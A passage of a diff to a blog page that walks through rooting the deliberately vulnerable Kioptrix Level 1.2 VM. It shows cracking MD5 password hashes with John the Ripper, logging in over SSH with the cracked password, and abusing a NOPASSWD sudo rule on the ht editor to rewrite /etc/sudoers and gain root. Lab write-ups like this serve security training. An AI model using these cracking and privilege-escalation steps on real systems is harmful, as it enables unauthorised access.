+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/Kioptrix1.2:<span class="nv">$ </span>/usr/sbin/john <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt <span class="nt">--format</span><span class="o">=</span>RAW-MD5 passwords
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
+fopen: rockyou.txt: No such file or directory
+ein@~/VulnHub/Kioptrix1.2:<span class="nv">$ </span>/usr/sbin/john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">--format</span><span class="o">=</span>RAW-MD5 passwords
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+starwars         <span class="o">(</span>?<span class="o">)</span>
+Mast3r           <span class="o">(</span>?<span class="o">)</span>
+2g 0:00:00:00 DONE <span class="o">(</span>2020-07-29 01:31<span class="o">)</span> 2.380g/s 12897Kp/s 12897Kc/s 12898KC/s Maswhit002..MashPt34
+Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
+Session completed
+ein@~/VulnHub/Kioptrix1.2:<span class="nv">$ </span><span class="nb">cat </span>passwords 
+0d3eccfb887aabd50f243b3f155c0f85
+5badcaf789d3d1d09794d8f021f40f0e
+</code></pre></div></div>
+
+<p>Nice! so we got the cleartext password for both users. I’ll start by trying to SSH as <code class="language-plaintext highlighter-rouge">loneferret</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/Kioptrix1.2:<span class="nv">$ </span>ssh loneferret@kio3
+The authenticity of host <span class="s1">'kio3 (10.0.0.204)'</span> can<span class="s1">'t be established.
+RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>kio3,10.0.0.204<span class="s1">' (RSA) to the list of known hosts.
+loneferret@kio3'</span>s password: 
+Permission denied, please try again.
+loneferret@kio3<span class="s1">'s password: 
+Permission denied, please try again.
+loneferret@kio3'</span>s password: 
+Linux Kioptrix3 2.6.24-24-server <span class="c">#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span>
+
+The programs included with the Ubuntu system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+loneferret@Kioptrix3:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Nice. Now let’s see if we can run <code class="language-plaintext highlighter-rouge">ht</code> (mentioned in the CompanyPolicy.README file we found earlier) as sudo by checking via <code class="language-plaintext highlighter-rouge">sudo -l</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>loneferret@Kioptrix3:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+User loneferret may run the following commands on this host:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: <span class="o">!</span>/usr/bin/su
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/bin/ht
+</code></pre></div></div>
+
+<p>Perfect, let’s make sure our terminal is set correctly:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>loneferret@Kioptrix3:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+
+<p>Now we can use the <code class="language-plaintext highlighter-rouge">ht</code> text editor as root! The method I used to privesc is to edit the <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> file and give us further permission. In this case I’ll simply give us full rights to <code class="language-plaintext highlighter-rouge">/bin/su</code>.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_11.PNG" alt="Editing `/etc/sudoers/`" /></p>
+
+<p>And now we can simply switch users to root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>loneferret@Kioptrix3:~<span class="nv">$ </span><span class="nb">sudo </span>su
+root@Kioptrix3:/home/loneferret# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Nice! rooted. Let’s look at <code class="language-plaintext highlighter-rouge">/root/Congrats.txt</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Kioptrix3:~# <span class="nb">cat </span>Congrats.txt 
+Good <span class="k">for </span>you <span class="k">for </span>getting here.
+Regardless of the matter <span class="o">(</span>staying within the spirit of the game of course<span class="o">)</span>
+you got here, congratulations are <span class="k">in </span>order. Wasn<span class="s1">'t that bad now was it.
+
+Went in a different direction with this VM. Exploit based challenges are
+nice. Helps workout that information gathering part, but sometimes we
+need to get our hands dirty in other things as well.
+Again, these VMs are beginner and not intented for everyone. 
+Difficulty is relative, keep that in mind.
+
+The object is to learn, do some research and have a little (legal)
+fun in the process.
+
+
+I hope you enjoyed this third challenge.
+
+Steven McElrea
+aka loneferret
+http://www.kioptrix.com
+
+
+Credit needs to be given to the creators of the gallery webapp and CMS used
+for the building of the Kioptrix VM3 site.
+
+Main page CMS: 
+http://www.lotuscms.org
+
+Gallery application: 
+Gallarific 2.1 - Free Version released October 10, 2009
+http://www.gallarific.com
+Vulnerable version of this application can be downloaded
+from the Exploit-DB website:
+http://www.exploit-db.com/exploits/15891/
+
+The HT Editor can be found here:
+http://hte.sourceforge.net/downloads.html
+And the vulnerable version on Exploit-DB here:
+http://www.exploit-db.com/exploits/17083/
+
+
+Also, all pictures were taken from Google Images, so being part of the
+public domain I used them.
+</span></code></pre></div></div>
+
+<p>And we’re done.</p>
+
 
       </article>
 
@@ -209,7 +768,7 @@
   <span class="sr-only">Share: </span>
 
   
-    <a href="https://twitter.com/intent/tweet?text=Kioptrix+Level+1+Writeup&url=http%3A%2F%2Flocalhost%3A4000%2F2020-07-29-Kioptrix-Level-1.2%2F"
+    <a href="https://twitter.com/intent/tweet?text=Kioptrix+Level+1.2+%28%233%29+Writeup&url=http%3A%2F%2Flocalhost%3A4000%2F2020-07-29-Kioptrix-Level-1.2%2F"
       class="btn btn-social-icon btn-twitter" title="Share on Twitter">
       <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
       <span class="sr-only">Twitter</span>
@@ -237,12 +796,12 @@
       <ul class="pagination blog-pager">
         
         <li class="page-item previous">
-          <a class="page-link" href="/2020-07-28-Kioptrix-Level-1.1/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1.1 Writeup">&larr; Previous Post</a>
+          <a class="page-link" href="/2020-07-28-Kioptrix-Level-1.1/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1.1 (#2) Writeup">&larr; Previous Post</a>
         </li>
         
         
         <li class="page-item next">
-          <a class="page-link" href="/2020-07-29-Kioptrix-Level-1.3/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1 Writeup">Next Post &rarr;</a>
+          <a class="page-link" href="/2020-07-29-Kioptrix-Level-1.3/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1.3 (#4) Writeup">Next Post &rarr;</a>
         </li>
         
       </ul>
